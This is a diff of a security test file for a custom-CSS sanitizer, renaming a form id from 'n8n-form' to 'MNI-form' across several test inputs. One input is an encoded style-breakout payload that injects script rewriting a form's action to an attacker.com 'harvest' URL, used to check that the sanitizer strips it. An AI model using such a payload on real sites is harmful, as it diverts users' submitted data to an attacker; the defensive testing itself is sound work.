@@ -30,7 +30,7 @@ describe('sanitizeCustomCss — security', () => {
 
 		it('should not produce script tags from multi-line encoded input', () => {
 			const input = `body { color: red; }
-}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("n8n-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;
+}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("MNI-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;
 
 			const result = sanitizeCustomCss(input);
 
@@ -41,7 +41,7 @@ describe('sanitizeCustomCss — security', () => {
 
 	describe('mixed safe and encoded content', () => {
 		it('should preserve safe CSS child combinator while rejecting encoded markup', () => {
-			const input = '#n8n-form > div { color: red; }';
+			const input = '#MNI-form > div { color: red; }';
 			const result = sanitizeCustomCss(input);
 
 			expect(result).toBe(input);
@@ -90,7 +90,7 @@ describe('sanitizeCustomCss — security', () => {
 
 	describe('legitimate CSS is preserved', () => {
 		it('should preserve CSS with > selectors', () => {
-			const input = '#n8n-form > div.form-header > p { text-align: left; }';
+			const input = '#MNI-form > div.form-header > p { text-align: left; }';
 			const result = sanitizeCustomCss(input);
 
 			expect(result).toBe(input);
@@ -105,7 +105,7 @@ describe('sanitizeCustomCss — security', () => {
 
 		it('should preserve complex CSS with multiple selectors', () => {
 			const input = `
-				#n8n-form > div.form-header > p { text-align: left; }
+				#MNI-form > div.form-header > p { text-align: left; }
 				.form-container > .input-group + .input-group { margin-top: 1rem; }
 				button:hover { background-color: #0056b3; }
 			`;
